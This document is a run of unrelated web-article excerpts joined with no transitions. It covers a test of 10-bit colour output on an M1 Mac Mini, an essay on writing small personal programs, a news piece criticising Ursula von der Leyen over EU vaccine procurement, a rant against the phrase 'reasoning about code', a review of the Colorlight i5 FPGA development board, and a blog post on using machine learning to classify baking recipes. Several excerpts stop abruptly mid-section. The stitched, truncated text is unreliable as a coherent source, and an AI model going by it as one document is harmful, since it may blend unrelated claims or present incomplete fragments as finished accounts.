<p>The prominent use of color no doubt stems from Steve Jobs obsessing over the smallest details. For instance, there was a time when Steve spent 30 minutes picking the <a href="https://www.businessinsider.com/steve-jobs-attention-to-detail-2011-10">perfect shade of gray for the restroom signs</a>! and another time <a href="https://www.businessinsider.com/steve-jobs-attention-to-detail-2011-10#he-insisted-on-making-the-circuit-board-inside-the-mac-look-great-2">when he insisted on making the circuit board inside the Mac look great</a>. An engineer told him:</p>
<blockquote>
<p>“The only thing that matters is how well it works. Nobody is going to see the PC board.”</p>
</blockquote>
<p>Jobs response was:</p>
<blockquote>
<p>“I want it to be as beautiful as possible, even if it’s inside the box. A great carpenter isn’t going to use lousy wood for the back of a cabinet, even though nobody’s going to see it.”</p>
</blockquote>

<p>For as long as we’ve had TVs, color has been an important metric to judge the display’s quality. We’ve witnessed technologies such as CRT, Plasma, and LCD compete to display the most life-like color. The newest technology to enter this fray is High Dynamic Range, aka HDR. The aim remains the same i.e. to recreate an image closer to that seen by the human eye. Traditionally, every video has been delivered in an 8-bit specification known as Rec. 709, displaying up to millions of shades of colors. HDR improves upon this by stepping up to 10 or 12-bit standard known as Rec. 2020 or BT.2020, representing 60 times more color combinations with smoother shade gradations aka “Billions of colors”.</p>
<p>Apple has generally been at the forefront of adopting the latest display technology. Some notable examples include - introducing high-resolution Retina Displays when 1366x768 was a very common resolution for Windows laptops, <a href="https://www.engadget.com/2015-10-30-apple-imac-5k-el-capitan-billions-colors.html">Shipping 2015 Retina iMacs</a> with 10-bit displays i.e. “Billions of colors”, <a href="https://www.apple.com/newsroom/2017/09/apple-tv-4k-brings-home-the-magic-of-cinema-with-4k-and-hdr/">Apple TV 4K, which was one of the first consumer devices to support Dolby Vision HDR in 2017</a>, <a href="https://www.apple.com/newsroom/2017/09/apple-tv-4k-brings-home-the-magic-of-cinema-with-4k-and-hdr/">automatic upgrades of HD titles to Dolby Vision</a> for iTunes users - a move that is still unrivaled, iPhone 12 which is the first smartphone to be able to <a href="https://www.apple.com/newsroom/2020/10/apple-introduces-iphone-12-pro-and-iphone-12-pro-max-with-5g/">record videos in the Dolby Vision HDR format</a>. Apple also sells <a href="https://www.apple.com/pro-display-xdr/">Pro Display XDR</a>, that costs upward of ~$5000 and ticks all the right boxes for any professional doing color-accurate work.</p>
<p>Therefore, with Apple’s color pedigree, it was surprising to see that on the M1 device specification page, there is <strong>no mention of whether M1 devices can output “Billions of colors”</strong>. In contrast, the Intel-based devices clearly outline this support.</p>

<p>Even the trusty method of viewing the value in <code>"About this mac" -&gt; "System Report" -&gt; "Graphics/Displays"</code> doesn’t show anything. Usually, this would list a value of 30-bit here (<em>i.e. 10-bit per RGB channel</em>). On M1 devices, the below is what you see when connected to an HDR capable display i.e. no mention of whether the M1 Mini is outputting a 10-bit video signal.</p>

<p><strong>So I set about testing 10-bit output support myself.</strong></p>

<li><strong>Monitor</strong> - Philips Brilliance P272P7VU 4K UHD 27" (<a href="https://www.displayspecifications.com/en/model/8e9287b">Display Specifications</a>)</li>
<li><strong>2020 Mac Mini M1</strong> connected through a HDMI cable</li>
</ul>

<p>For this test, I used my trusty 2017 Vizio M65-E0 TV that has a 10-bit panel. I connected the Mac Mini to my Denon AVR-X1300 receiver. The “Displays” settings on Mac OS immediately gave me an option of enabling HDR.</p>

<p>At this point, it’s clear that the Mac Mini can output an HDR10 signal when connected to an HDR capable display. Next, I explored if it can output a 10-bit signal / Billions of colors to a non-HDR 10-bit display. This was done by connecting to the Philips Brilliance P272P7VU monitor.</p>
<h3 id="10-bit-psd-test">10-bit PSD test</h3>
<p>The first test was done by displaying a 10-bit PSD file in “Preview”, which supports 10-bit files. <strong>If the M1 outputs a 10-bit signal, then the gradients in the file would be smooth.</strong> Opening the file in “Preview” confirmed the 10-bit output as the test pattern was completely smooth. I also opened the same file in another image viewer called “Pixea” and observed banding which most likely is because “Pixea” doesn’t support 10-bit files. In the image below, the same file is open in “Preview” on the left and “Pixea” on the right.</p>
<p>NOTE: <em>You might not observe the difference between the two images below as during the upload and publishing this image might get converted to 8-bit. On my machine the left image is completely smooth while the right displays banding.</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Over the summer, I developed a couple of small, sort of silly programs.
One, <a href="https://jakemccrary.com/experiments/photo-fit/">Photo Fit</a>, is a little tool that runs in a web browser and resizes photos to fit as your phone’s background.
The other, <a href="https://default-equipment.herokuapp.com/">Default Equipment</a>, runs on Heroku and automates changing the “bike” of my Strava-tracked e-bike rides to be my <a href="https://onewheel.com/">onewheel</a>.</p>

<p>These weren’t created to solve large problems in the world.
There is no plan to make any money with them.
As of October 2020, Default Equipment doesn’t even work for other people (though it could, send me a message if you’d like to use it and I’ll get around to it).</p>

<p>Each was created to fix a minor annoyance in my life and, because these tools can live on the Internet, they can fix the same minor annoyance in other lives.</p>

<p>With an increasing amount of software in the world, being able to write software is nearly sorcery<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>.
As a developer, you can identify a problem in the world and then change the world to remove that problem.
And, depending on the problem, you can remove it for everyone else.</p>

<p>Software developers aren’t alone in being able to identify problems and remove them through creation.
Carpenters can build shelves for their books.
Cooks can prepare food to remove hunger.
You can come up with nearly an infinite number of other examples.</p>

<p>The difference is that a solo developer can solve problems for an unknown number of other folks.
This is enabled by the Internet enabled ease of distribution.
This is very powerful.</p>

<p>Developers can expose their solution to others through a web application.
Desktop or mobile applications can be distributed through various app stores or made available as a download.
Source code can be made available for others to run.
Being able to distribute easily and cheaply is a game changer.</p>

<p>A developer’s change to the world might be a minor improvement.
Photo Fit might never be used by anyone besides me.
But it is still out there, making the world slightly better.
It is available for someone to stumble upon when they are also annoyed by the same problem.</p>

<p>It felt good to write these tiny, useful programs.
If you scope them small enough, there is a definitive ending point<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>.
This lets you feel that finishing-a-project satisfaction quickly.
The small size also allows you experiment with new techniques and tools without committing to a large and ongoing commitment.</p>

<p>I wrote both Photo Fit and Default Equipment in TypeScript.
Before the beginning of summer, I didn’t know TypeScript and had little exposure to Node.js.
Now I have some experience with both and gained that while making small improvements to my life and potentially the lives of others.</p>

<p>If you haven’t developed software to solve a small problem recently, I’d recommend doing it.
Don’t hesitate to remove a problem that feels silly.
Removing those problems can still make your life slightly better and gives you an opportunity to learn.
It feels good to remove an annoyance from your life.
If you can, make that software available to others so their lives are improved as well.
Take advantage of the power of easy distribution to improve the world and not just your tiny slice of it.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>When European Commission President Ursula von der Leyen talks about politics, there is never a shortage of superlatives and grandiloquence. Until recently, that was also true when she was talking about the extremely sensitive issue of vaccines.</p>


<div>
<p>In late November, von der Leyen gushed about the contracts the European Union had signed with various producers, saying it meant that Europeans would have "access to the most promising future vaccines under development" against the coronavirus. When it became clear in December that the first people in the EU would be vaccinated soon after Christmas, she even injected a bit of pathos, tweeting "It's Europe's moment." When the vaccinations then began, she wrote of a "touching moment of unity" and a "European success story."</p><p>These days, though, von der Leyen is noticeably quieter – a silence that could have to do with the fact that the erstwhile "success story" might ultimately turn out to be the greatest disaster of her entire political career.</p>
</div>

<div>
<p>Europe is facing a vaccine disaster. Whereas countries like Israel, Britain and the United States. are quickly moving ahead with vaccinations, the EU is reeling from a string of setbacks. First, U.S. pharmaceutical giant Pfizer and its German partner BioNTech informed Brussels that it would be delivering far less vaccine than planned in the coming weeks. Then, the company AstraZeneca said it would only be delivering 31 million doses of its vaccine by the end of March instead of the 80 million Europe had been expecting. And again, the Commission was caught completely off guard.</p><p>Since then, frustration and anger has been growing across the EU. Europe, one of the most affluent regions in the world, is proving to be unable to quickly protect its citizens from a deadly disease, while other countries are showing how it is done.</p>
</div>

<div>
<p>And the boss is nowhere to be found.</p><p>The louder the criticism has grown, the less has been heard from the erstwhile loquacious Commission president. She has, at times, been like the phantom of Brussels. Requests for comment from the press have been systematically blocked by her communications department and she has essentially gone into hiding. This week, though, at the World Economic Forum, she wasn't able to entirely avoid the issue. "Now, the companies must deliver," she said. In other words, the companies are to blame, not us. Not me.</p><p>It is, to put it bluntly, a pattern that has occurred frequently throughout her career.</p>
</div>

<p>Whenever von der Leyen, a member of Chancellor Angela Merkel's Christian Democrats (CDIU), has taken on a new leadership position, she has never just been the new minister. She has always acted as though she would do everything different – better – than her predecessor. It has frequently sounded as though von der Leyen planned to reinvent whatever department or ministry she had just assumed control of, making it more functional and more glamorous at the same time. But by the time it became necessary to dive into the sordid details, she had usually moved on.</p><h3>Posing as the Mother of the Nation</h3><p>When von der Leyen was appointed family minister in 2005, she introduced a generous federally funded program for parental leave and expanded daycare offerings, essentially revolutionizing her party's family-policy image in the process. But when it came to addressing the difficulties associated with opening a huge number of new daycare facilities – that was left to her successor.</p><p>When she became minister of labor and social affairs in 2009, she promised a hot lunch for every child. The result, though, was a confusing collection of regulations. "Ursula von der Leyen was excellent at posing as the mother of the nation and launching illusory programs for the poor," says Ulrich Schneider, head of the federation of German welfare associations.</p>

<p>And at the Defense Ministry? The bureau is still trying to clean up the messes that its former boss left behind.</p><p>In each instance, von der Leyen's departure was perfectly timed. Just as the time had come for evaluations, she had already climbed up to the next rung on her career ladder.</p><p>Which is why she is now faced with a real problem. First of all, there isn't really anywhere left to go from her current post in Europe's top position. And second, the pandemic has hit the fast-forward button on political developments, with the consequences of political decisions taking mere weeks to manifest themselves instead of several years. "I am absolutely stunned by how negligent Ursula von der Leyen has been in overseeing the start of vaccinations in recent months," says Lars Klingbeil, general secretary of Germany's Social Democrats (SPD).</p><p>Indeed, von der Leyen finds herself in an extremely difficult situation. The next several weeks could decide her political future.</p><p>On Tuesday of this week, she delivered a video address to the World Economic Forum, where she spoke about Donald Trump, the storming of the Capitol and the question as to whether democracy has been damaged in the last four years. She spoke about climate change, biodiversity, artificial intelligence and digitalization.</p><p>In the first several minutes of her talk, she only briefly mentioned the coronavirus pandemic, and it was fully 15 minutes before she even said the word "vaccine." Only to say things like: "We know that in a pandemic there is no time to lose."</p><h3>Bazaar Bargaining</h3><p>Initially, of course, things looked quite good on the vaccine front. Back in summer, nobody was willing to predict that the first vaccine would be approved in the EU as early as December and that vaccinations would begin. Nor that a second vaccine would quickly follow in January. Von der Leyen was also able to claim a significant success when the EU agreed on a joint vaccination strategy in June, despite the fact that the bloc's 27 member states had always defended sovereignty when it came to health care policy. For the Commission president, it represented a gain of both prestige and power. Fleetingly, at least.</p><p>The problems began soon thereafter. Negotiations with vaccine producers bogged down, and it wasn't until November that the EU was able to reach a purchase agreement with BioNTech/Pfizer and with Moderna, the manufacturers of the two most successful vaccines thus far introduced. The EU negotiating team, according to people familiar with the talks, was intent on pushing down the price. There was also allegedly an extended disagreement on liability issues, particularly with Pfizer.</p><p>While others simply acted with expedience and placed huge orders, the EU – right in the middle of the worst pandemic in a century – decided to bargain like they were at the bazaar. Von der Leyen, of course, didn't lead these negotiations personally. But she is the boss, and carries the political responsibility.</p><p>After a year of the pandemic, hundreds of millions of Europeans are tired, frustrated and desperate for an appointment to finally get vaccinated. No other issue is as important at the moment – for the economy, for society and for politics. And the time will come to assign blame for the missteps that have been made. The search for where to place that blame won't start down below among the army of EU bureaucrats. It will start at the top.</p>
</div>

<div>
<p>Given that truth, von der Leyen's press department has been energetic in its defense of the Commissions actions. After all, the EU has secured rights to 2.3 billion doses of vaccine, they have pointed out, with 760 million of them from BioNTech/Pfizer and Moderna.</p><p>But what use is that when the availability of the vaccine will remain so limited for the foreseeable future? When the producers are unable to deliver what they have agreed to – or can only deliver much later?</p><p>And what, actually, is in those contracts, which have thus far remained confidential? Are the deliveries promised by the producers legally binding? Or did the Commission agree to flimsy fine print such that it has no leverage against the producers?</p><p>Thus far, only the contract with the German company Curevac has been made public. It says that the producer will make "reasonable best efforts" to deliver the agreed upon number of doses within the negotiated time frame. Pascal Soriot, the head of AstraZeneca, is now claiming the same thing. The Curevac contract also says that the producer must inform purchasers as quickly as possible of possible delays, explain the causes for those delays and present a revised timeline for delivery. That, though, is all.</p><p>Should the AstraZeneca contract contain the same language, it would be politically explosive. Tiemo Wölken, a member of European Parliament with Germany's Social Democrats, believes the contract is similar in that regard. "The wording of the delivery requirement for Curevac is supposedly similar," he says. "As such, what Soriot is saying doesn't sound implausible."</p><p>That would be a huge embarrassment for von der Leyen, but it would come as welcome news for a man who isn't yet out of the firing line himself: German Health Minister Jens Spahn. At home, Spahn has been the subject of scathing critique for the flubbed beginning of the vaccination campaign. Spahn, who just recently warned the country that "10 difficult weeks" were still to come, is now able to deflect some of the criticism to Brussels – onto the shoulders of fellow CDU member Ursula von der Leyen.</p><h3>Moving Too Slowly</h3><p>There is a history to their vaccine-related relationship. In mid-June, Spahn pushed ahead with his counterparts from France, the Netherlands and Italy, reaching an initial agreement with AstraZeneca. They planned to share the order with all EU member states. But that's not how things worked out.</p><p>Several countries intervened, the Chancellery in Berlin got involved and, in late June, Spahn and the others handed over responsibility for the negotiations to the European Commission.

		<p>Another day, another post telling me to do something, or not do something, or adopt some technology, or not adopt some technology, or whatever it is that they want me to do, because it makes it easier to “reason about the code”.</p>
<p>It’s a scam.</p>
<p>More precisely, it’s a thought-terminating cliche. Ironic, as the phrase “reason about” is used as a highfalutin synonym for “think about”. The idea is that there’s nowhere to go from here. I want to do things one way, some random on medium dot com wants me to do things another way, their way makes it easier to reason about the code, therefore that’s the better approach.</p>
<p>It’s a scam.</p>
<p>Let’s start with the fact that people don’t think—sorry, reason—about things the same way. If we did, then there’d be little point to things like film review sites, code style guides, or democracy. We don’t know precisely <em>what</em> influences different people to think in different ways about different things, but we have some ideas. Some of the ideas just raise other questions: like if you say “it’s a cultural difference” then we have to ask “well, why is it normal for all of the people in that culture to think this way, and all of the people in this culture to think that way?”</p>
<p>This difference between modes of thought arises in computing. We know, for example, that you can basically use any programming language for basically any purpose, because back in the days when there were intellectual giants in computering they demonstrated that all of these languages are interchangeable. They did so before we’d designed the languages. So choice of programming language is arbitrary, unless motivated by external circumstances like which vendor your CTO plays squash with or whether you are by nature populist or contrarian.</p>
<p>Such differences arise elsewhere than in choice of language. Comprehension of paradigms, for example: the Smalltalk folks noticed it was easier to teach object-oriented programming to children than to professional programmers, because the professional programmers already had mental toolkits for comprehending programming that didn’t integrate with the object model. It’s easier for them to “reason about” imperative code than objects.</p>
<p>OK, so when someone says that something makes it easier to “reason about” the code, what they mean is that <em>that person</em> find it easier to think about code in the presence of this property. I mean, assuming they <em>do</em>, and are not disingenuously proposing a suggestion that you do something when they’ve run out of reasons you should do it but still think it’d be a good idea.  But wait.</p>
<p>It’s a scam.</p>
<p>Code is a particular representation of, at best, <em>yesterday’s</em> understanding of the problem you’re trying to solve. “Reasoning about code” is by necessity accidental complexity: it’s reflecting on and trying to understand a historical solution of the problem as you once thought it was. That’s effort that could better be focussed on checking whether your understanding of the problem is indeed correct, or needs updating. Or on capturing a solution to an up-to-the-minute model of the problem in executable form.</p>
<p>This points to a need for code to be <em>deletable</em> way faster than it needs to be thought about.</p>
<p>Reasoning about code is a scam.</p>

<p>There are hundreds of FPGA development boards out there, and I don’t dare to count but I must own a
considerable fraction of them. Most of these are designed deliberately for development purposes, 
but a few are not, and yet they can sometimes be a good match.</p>

<p>One board that falls in this category is the 
<a href="https://www.colorlight-led.com/product/colorlight-i5-led-display-receiver-card.html">Colorlight i5</a>.</p>

<p><img src="https://tomverbeure.github.io/assets/colorlight_i5/colorlight_i5.jpg" alt="Colorlight i5"></p>

<p>Like other members of the Colorlight family (the <a href="https://github.com/q3k/chubby75">Colorlight 5A-75B</a> 
comes to mind), the i5 is ‘real’ product that is designed for one specific purpose: it is a 
controller for large LED video panels. And that’s a huge plus, because in FPGA land, high volume means 
low cost, usually much lower than buying individual components on Digikey or Mouser.</p>

<p>The Colorlight i5 is especially attractive because it’s a plug-in card, with a reappropriated DDR SODIMM 
connector. Even better is that nothing about this module seems to be tailored specifically for LED panels. 
Unlike the 5A-75B, there are no unidirectional 3V3 to 5V level shifters: FPGA GPIO pins are routed straight to the 
SODIMM connector and can be used any way you want: input or output, LVCMOS or LVDS or any configuration
that’s supported by the FPGA.</p>

<p>The Colorlight i5 uses a Lattice ECP5U-25, an FPGA that’s supported by the Yosys/NextPNR open source
tool flow, an extra bonus.</p>

<p>That said, there’s still a hurdle to using this board as development platform: you need a way to power it,
there are no easy usable GPIO connectors (such as PMOD connectors), and while are easily accessible
test JTAG points to program the FPGA, you still need an external JTAG programmer and solder a bunch
of wires to make things work.</p>

<p>Or…</p>

<p>you could go to the <a href="https://www.aliexpress.com/item/1005001686186007.html">AliExpress webstore</a> of
<a href="https://www.muselab-tech.com/">Muse Lab</a> and buy their Colorlight i5 development board.</p>

<p><img src="https://tomverbeure.github.io/assets/colorlight_i5/development_board.jpg" alt="Colorlight i5 Development Board"></p>

<p>I bought their Colorlight i5 module + development board combo for $50 and gave it a try.</p>



<p><em>Skip to <a href="#from-unboxing-to-blinky">From Unboxing to Blinky</a> if you want to get your hands dirty ASAP.</em></p>

<p>Let’s first go over characterstics of the module itself:</p>

<p><img src="https://tomverbeure.github.io/assets/colorlight_i5/i5-top-annotated.jpg" alt="Colorlight i5 Top Annotated"></p>

<ul>
  <li>
    <p>Low Cost: $30 and up</p>

    <p>I’ve seen these modules for $18.50, but with a $25 shipping fee, which makes it only attractive if you’re
  buying at least 3. For $35, you can get them with free shipping on AliExpress. That’s
  still a fantastic deal for what you get.</p>
  </li>
  <li>
    <p>Lattice ECP5 LFE5U-25F FPGA</p>

    <p>Specifications:</p>
    <ul>
      <li>24K LUTs</li>
      <li>56x sysMEM block RAMs (of 18Kb each), good for up to 126KByte of on-chip RAM</li>
      <li>194Kb of distributed RAM</li>
      <li>28x DSPs with 18x18 multiplier and 36-bit accumulator</li>
      <li>2 PLLs, 2 DLLs</li>
      <li>0 SERDES</li>
      <li>381 caBGA package</li>
    </ul>

    <p>The -25 version is one of the smaller versions in the ECP5 family, but it’s still enough
  for many applications. You can comfortably fit a VexRiscv-based Linux SOC in there.</p>
  </li>
  <li>
    <p>EtronTech EM638325-6H 2M x 32bit SDRAM, 166MHz</p>

    <p>Single data rate SDRAM is ancient and slow now, but sufficient for most hobby projects. It’s also 
  easier to use because there’s usually no trickery required with complex PLL/DLL configurations.</p>
  </li>
  <li>
    <p>2x Broadcom B50612D 1Gb Ethernet Transceivers</p>

    <p>That’s right, not one but two. You could make your own firewall with this thing.</p>

    <p>The PHYs are using an RGMII MAC interface.</p>

    <p>The module only contains the transceivers, not the Ethernet transformers or 
  RJ45 connectors. The 2x 4 differentials pairs are routed to the SODIMM pins.</p>

    <p>Check out <a href="https://github.com/kazkojima/colorlight-i5-tips#ethernet">this Ethernet expansion board</a>

    <p><img src="https://tomverbeure.github.io/assets/colorlight_i5/ethernet_expansion_board.jpg" alt="Ethernet expansion connected to development board"></p>
  </li>
  <li>
    <p>GD25B16C 16Mbit Quad SPI Serial Flash</p>

    <p>According to the <a href="http://www.latticesemi.com/~/media/LatticeSemi/Documents/ApplicationNotes/EH/TN1260.pdf">Lattice ECP5 sysCONFIG Usage Guide</a>,
  the FPGA has a maximum uncompressed bitstream size of 5.42Mb. That leaves more than 11Mb or ~1.4MByte for
  user applications.</p>
  </li>
  <li>
    <p>25MHz Oscillator</p>

    <p>The Ethernet transceivers require a 25MHz oscillator. It also goes to the FPGA as its only external clock
  input.</p>
  </li>
  <li>
    <p>2 LEDs</p>

    <p>A red LED seems to be connected to power and is always on, but the green LED is controlled
  by the FPGA: a strict requirement to get that blinky going!</p>
  </li>
  <li>
    <p>JTAG Interface</p>

    <p>4 JTAG test points are not marked as such but they are easy to solder and accessible.</p>
  </li>
  <li>
    <p>3x Mystery CD4051B 8 Channel Analog Multiplexer/Demultiplexer</p>

    <p>These are only present on V7.0 of the board, not on V6.0. Its functionality hasn’t been
  reverse engineered yet, but some of the demultiplexed ports are going to the SODIMM pins.</p>
  </li>
  <li>
    <p>DDR-SODIMM Connector</p>

    <ul>
      <li>
        <p>3V3 to 6V power rail</p>

        <p>There are voltage regulators on the module, but there are no pins back to
  the connector with regulated voltage.</p>
      </li>
      <li>2x 4 differential Ethernet pairs</li>
      <li>106x general purpose GPIO pins</li>
      <li>
        <p>2 mystery <code>RCV_BK1</code>/<code>RCV_BK2</code> pins</p>

        <p>These have something to do with receiver backup power. Unknown how they are connected
  on the module.</p>
      </li>
      <li>
        <p>21 mystery pins</p>

        <p>Related to the 8 channel analog multiplexers.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>A heat sink</p>

    <p>Not exactly a heavy duty one, but a piece of metal that squeezes against the FPGA and
  the two Ethernet transceivers. Much better than nothing!</p>

    <p><img src="https://tomverbeure.github.io/assets/colorlight_i5/heatsink_removed.jpg" alt="Board and Heatsink"></p>

    <p>The heat sink is pretty easy to remove without damaging the board.</p>
  </li>
</ul>

<p>There’s a lot to work with here. What’s even better is the potential for future
upgrades: Colorlight has i6, i9, and i9+ modules with the same SODIMM pinout as the i5, but
with larger FPGAs: the i9 board has a Lattice ECP5-45. The i9+ a Xilinx Artix A50T.</p>

<p>For the i5 board, V6.0 and V7.0 are pinout compatible too, with the exception of the mystery pins.</p>



<p>As I wrote earlier, the development board can be <a href="https://www.aliexpress.com/item/1005001686186007.html">bought on AliExpress</a>, 
but only as a package deal: $50 for the development board and the i5 module, with free shipping.</p>

<p><img src="https://tomverbeure.github.io/assets/colorlight_i5/development_board-annotated.jpg" alt="Development Board Annotated"></p>

<p>It has the following features:</p>

<ul>
  <li>DDR-SODIMM socket for the i5 module</li>
  <li>
    <p>1x 30-pin connector for Ethernet (purple)</p>

    <p>This connector has the 2x 4 differential Ethernet pairs.</p>
  </li>
  <li>
    <p>4x 30-pin connectors for generic GPIOs (yellow)</p>

    <p>Each connector has 20 GPIOs, ground, 3V3, and 5V pins. The
  pins are smartly organized so that the connector is also compatible
  with 2 side-by-side PMOD connectors.</p>

    <p><img src="https://tomverbeure.github.io/assets/colorlight_i5/board_with_double_PMOD.jpg" alt="Board with double PMOD"></p>

    <p>In this case, the center pins can’t be used and the number of usable GPIOs 
  per 30-pin connector drops to 16, 8 for each PMOD.</p>
  </li>
  <li>
    <p>1x 30-pin mixed-use connector for generic GPIOs + special functions (orange)</p>

    <p>Just like the 4 earlier connectors, there are 20 GPIOs on this connector,
  in the same configuration, but 6 of the GPIOs have been assigned
  a special meaning: UART and SPI.</p>

    <p>The UART and SPI pins are also routed to the microcontroller to be used as
  a potential FPGA debug console, and, presumably to progam the SPI
  flash on the board.</p>
  </li>
  <li>
    <p>HDMI connector - video out only</p>

    <p>This one is a surprise, since the FPGA on the module does not support
  high speed SERDES IOs. Instead, the pins are connected to generic
  IOs that can be configured as differential pairs inside the FPGA.</p>

    <p>I doubt that these IOs meet the strict electrical requirements that are
  set by the HDMI standard specification, but meeting these requirements is 
  not necessary to drive an image that can be decoded by most monitors.</p>

    <p>Unfortunately, the I2C, HOTPLUG and CEC pins of the HDMI connector
  are not connected. The lack of HOTPLUG makes it impossible to use
  the HDMI connector for video input.</p>
  </li>
  <li>
    <p>USB C Port</p>

    <p>A USB C port is used to power the board, to program the FPGA, and to
  send FPGA UART console traffic from and to a host PC.</p>
  </li>
  <li>
    <p>STM32F103C8T6 microcontroller (MCU)</p>

    <p>This STM32 MCU is identical to the one used on the dirt cheap and popular 
  <a href="https://stm32-base.org/boards/STM32F103C8T6-Blue-Pill.html">Blue Pill development boards</a>.</p>

    <p>The MCU on this development board is used as programming and debug
  interface only. On one side, it has a USB 1.1 interface to connect to a host
  PC. On the other, it controls JTAG, UART, and SPI pins to the Colorlight
  module. It also controls 2 LEDs.</p>

    <p>The user is not supposed to reflash the MCU with custom firmware, but if
  you’re so inclined, the SWD pins to do so are located underneath the
  USB connector (on the other side of the PCB.)</p>
  </li>
  <li>
    <p>USB 5V -&gt; 3.3V voltage regulator</p>

    <p>An AMS1117-3.3V that’s used to convert the USB 5V to 3V3 to power the MCU and the
  3v3 pins of the PMOD ports, but NOT the Colorlight module (which is powered by USB 5V rail 
  and has its own voltage regulators.)</p>
  </li>
  <li>
    <p>2 LEDs</p>

    <p>Not to be confused with the 2 bright LEDs on the module itself, two tiny and faint LEDs 
  are controlled by the MCU. The red LED flickers when there’s USB traffic. A blue
  LED seems to be always on and is hidden entirely underneath the module.</p>
  </li>
  <li>
    <p>Power Button</p>

    <p>When pressed, this button interrupts power to Colorlight module, but not to the MCU. If you
  want to power off the MCU, you must unplug the USB cable.</p>
  </li>
  <li>
    <p>JTAG Pogo Pins</p>

    <p>While the i5 module has easy accessible JTAG test points, they are not connected to the SODIMM
  connector. The development board makes the connection with the test points with 4 pogo pins.
  It’s an elegant solution that removes the need for any soldering.</p>
  </li>
</ul>



<p>The package arrived with the i5 module (V7.0), the development board, a USB C cable, and 6 30-pin
connectors that you need to solder yourself.</p>

<p><img src="https://tomverbeure.github.io/assets/colorlight_i5/box_contents.jpg" alt="Box Contents"></p>

<p>I’m not well qualified to judge the quality of the PCB, but it looks well made to me.</p>

<p>After inserting the 30-pin connectors into the PCB (it’s a bit of a hassle that requires
wiggling slightly bent pins in the right hole), I noticed a minor issue: my HDMI cable doesn’t fit between the 2 30-pin connectors
that surround the HDMI connector. As a result, the cable can’t be plugged in completely:</p>

<p><img src="https://tomverbeure.github.io/assets/colorlight_i5/hdmi_doesnt_fit.jpg" alt="HDMI doesn't fit"></p>

<p>You need a HDMI cable with a narrow connector to make things work, or don’t solder connectors
P2 and P3, which is what I did.</p>

<p>The box doesn’t contain any documentation, not even a leaflet with a URL. You have …</p></div></article></div></div></div>

	  <p>Like many people, I’ve been entertaining myself at home by baking a ton and talking about my sourdough starter as if it were a real person. I’m pretty good at following recipes, but I decided I wanted to take things one step further and understand the science behind what differentiates a cake from a bread or a cookie. I also like machine learning so I thought: what if I could combine it with baking??!</p>

<p>I’ll start by explaining why baking presents an interesting ML problem. Then I’ll show you how I collected my own dataset, trained a simple model, deployed it, built a little app to get predictions, and used the model to invent a new recipe. If you’re only here for the recipe, I suppose you can <a href="#recipe">skip ahead</a>.</p>

<p>Are videos more your thing? Here’s me <a href="https://www.youtube.com/watch?v=-4saaQZSmBw">speaking about</a> how I built this.</p>

<p>Maybe you’re thinking, couldn’t you just read a book or even a <a href="https://lifehacker.com/how-to-free-yourself-from-recipes-with-a-few-golden-coo-1450617561" target="_blank">blog post</a> that explains the sugar, fat, and flour ratios that make up different baked goods? Sure, I could do that. But my attention span has been pretty short these days, and that approach doesn’t really scale. If I learn enough to start inventing my own recipes, that only directly benefits the people who can eat them, which is currently not many.</p>

<p>Now maybe you’re thinking, couldn’t we solve this with traditional programming? For example, if the typical flour:liquid ratio for bread is 5:3, I could write a program like this:</p>

<figure><pre><code data-lang="python"><span>ratio</span> <span>=</span> <span>flour_amt</span> <span>/</span> <span>water_amt</span>

<span>if</span> <span>ratio</span> <span>&gt;</span> <span>1.5</span> <span>and</span> <span>ratio</span> <span>&lt;</span> <span>2</span><span>:</span>
    <span>print</span><span>(</span><span>"It's bread!"</span><span>)</span></code></pre></figure>

<p>That <em>kind of</em> works, but it’ll quickly get unwieldy. What if the flour:water ratio is close, but not exactly 5:3? What if I want to predict more than just bread? And what if I don’t feel like converting ingredient amounts into ratios? I am lazy (in certain ways) and I want to input my ingredient amounts without doing any math, and then have something magically tell me what it thinks it is.</p>

<p>Enter 🌟 machine learning 🌟</p>

<p>This is a great fit for ML because I can gather recipe data and train a model to identify patterns in that data. Since a lot of people have written about baking ratios, I’m going to assume there are some high-level patterns about them that I can teach a model to learn.</p>

<p>Hopefully by now I’ve convinced you that this will be a fun problem to solve with machine learning. But maybe you’re <em>still</em> skeptical, and you’re wondering: what’s the point of this? Don’t you already know what you’re baking when you follow a recipe? It seems silly to have a model tell you what you already know. All of that is true if I simply input an existing recipe into my model and ask it for a prediction. Remember, though, that the whole reason I’m doing this is to learn things like what makes a cake a cake, and not a cookie. Then I can experiment with different ratios to create a new recipe. Maybe I want to invent something that my model thinks is 50% cake, 50% cookie.</p>

<h2 id="creating-the-dataset">Creating the dataset</h2>

<p>I couldn’t find an existing dataset of basic baking ingredients, so I decided to create my own very small one. Luckily there is no shortage of recipes on the internet, and I found 33 recipes each of breads, cakes, and cookies to make a dataset with 99 total recipes. To keep this problem relatively simple, I looked only at the following ingredients:</p>

<ul>
  <li>Flour: If a recipe called for different types of flour, I counted it it all towards the flour amount</li>
  <li>Sugar: I also combined different sugars (granulated, brown, etc.) as one amount</li>
  <li>Sourdough starter: If you know, you know</li>
  <li>Salt</li>
  <li>Yeast</li>
  <li>Milk</li>
  <li>Water</li>
  <li>Oil</li>
  <li>Eggs</li>
  <li>Baking powder</li>
  <li>Baking soda</li>
  <li>Butter</li>
</ul>

<p>I tracked it all in a spreadsheet that looks like this:</p>

<p><img src="https://sararobinson.dev/assets/media/spreadsheet.png" alt="Baking spreadsheet dataset"></p>

<p>I know, I’m using cups and teaspoons and not something more universal like grams. If my little model becomes a smash hit, I will try to add metric system support.</p>

<p>While collecting the data, I did my best to include various types of breads, cakes, and cookies so that the model could handle a diverse repertoire of baked goods.</p>

<h2 id="processing-data">Processing data</h2>

<p>I went into this thinking I could feed my ingredient inputs directly into my machine model, since ML model inputs need to be numeric. Not quite. There are a few problems with the data in its current form.</p>

<p>First, my spreadsheet has a mix of units: I’m using cups for some ingredients, teaspoons for others, and eggs are just eggs. I don’t want my model to think that 1 unit of flour is the same as 1 unit of yeast (can you imagine what would happen there?). Since the majority of my data is in cups, I decided to convert everything else to cups. For teaspoons, this was fairly straightforward since 1 teaspoon is around .02 cups. For eggs, after some research I settled on 1 egg being approximately .2 cups. It’s not perfect, but now everything is in the same units.</p>

